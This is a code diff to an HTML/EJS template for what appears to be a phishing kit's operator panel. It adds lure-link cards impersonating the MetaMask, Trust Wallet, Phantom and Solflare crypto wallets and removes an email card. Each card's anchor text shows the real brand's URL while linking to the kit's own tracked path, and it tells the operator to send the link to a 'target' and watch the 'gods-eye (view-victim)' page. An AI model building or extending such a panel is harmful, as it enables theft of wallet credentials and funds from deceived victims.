@@ -18,6 +18,45 @@
 
 
 
+
+<!-- THIS IS FOR META MASK -->
+<div class="metamask">
+    <div class="icon">
+        <i class="fa-brands fa-ethereum"></i> <!-- Add an icon representing MetaMask -->
+    </div>
+    <!-- Copy URL Button -->
+    <div class="url">
+        <button onclick="copyURL('/metamask?userId=<%= userId %>')">
+            <i class="fa-solid fa-link"></i> Copy MM URL
+        </button>
+        <a href="/metamask?userId=<%= userId %>">https://www.metamask.io</a>
+    </div>
+    <p><strong>Instruction:</strong> Copy the link and send it to your target. When the target hits it, check your gods-eye (view-victim).</p>
+</div>
+
+
+
+
+    <!-- THIS IS FOR TRUST WALLET -->
+    <div class="trustwallet">
+        <div class="icon">
+            <img src="/uploads/trustwallet1.png" alt="exness" width="60%" class="exness-img">
+        </div>
+        <!-- Copy URL Button -->
+        <div class="url">
+            <button onclick="copyURL('/trustwallet?userId=<%= userId %>')">
+                <i class="fa-solid fa-link"></i> Copy TW URL
+            </button>
+            <a href="/trustwallet?userId=<%= userId %>">https://www.trustwallet.com</a>
+        </div>
+        <p><strong>Instruction:</strong> Copy the link and send it to your target. When the target hits it, check your
+            gods-eye (view-victim).</p>
+    </div>
+
+
+
+
+
     <!-- THIS IS FOR EXNESS -->
     <div class="exness">
         <div class="icon">
@@ -36,21 +75,43 @@
 
 
 
-    <!-- THIS IS FOR EMAIL -->
-    <div class="email">
-        <div class="icon">
-            <i class="fa-solid fa-envelope"></i>
-        </div>
-        <!-- Copy URL Button -->
-        <div class="url">
-            <button onclick="copyURL('/email?userId=<%= userId %>')">
-                <i class="fa-solid fa-link"></i> Copy EM URL
-            </button>
-            <a href="/email?userId=<%= userId %>">https://mail.example.com</a>
-        </div>
-        <p><strong>Instruction:</strong> Copy the link and send it to your target. When the target hits it, check your
-            gods-eye (view-victim).</p>
+
+<!-- THIS IS FOR PHANTOM -->
+<div class="phantom">
+    <div class="icon">
+        <img src="/uploads/phantom.png" alt="exness" width="35%" class="exness-img">
     </div>
+    <!-- Copy URL Button -->
+    <div class="url">
+        <button onclick="copyURL('/phantom?userId=<%= userId %>')">
+            <i class="fa-solid fa-link"></i> Copy Phantom URL
+        </button>
+        <a href="/phantom?userId=<%= userId %>">https://www.phantom.app</a>
+    </div>
+    <p><strong>Instruction:</strong> Copy the link and send it to your target. When the target hits it, check your gods-eye (view-victim).</p>
+</div>
+
+
+
+<!-- THIS IS FOR SOLFLARE -->
+<div class="solflare">
+    <div class="icon">
+        <img src="/uploads/solflare.png" alt="exness" width="35%" class="exness-img">
+    </div>
+    <!-- Copy URL Button -->
+    <div class="url">
+        <button onclick="copyURL('/solflare?userId=<%= userId %>')">
+            <i class="fa-solid fa-link"></i> Copy Solflare URL
+        </button>
+        <a href="/solflare?userId=<%= userId %>">https://www.solflare.com</a>
+    </div>
+    <p><strong>Instruction:</strong> Copy the link and send it to your target. When the target hits it, check your gods-eye (view-victim).</p>
+</div>
+
+
+
+
+
 
 
 
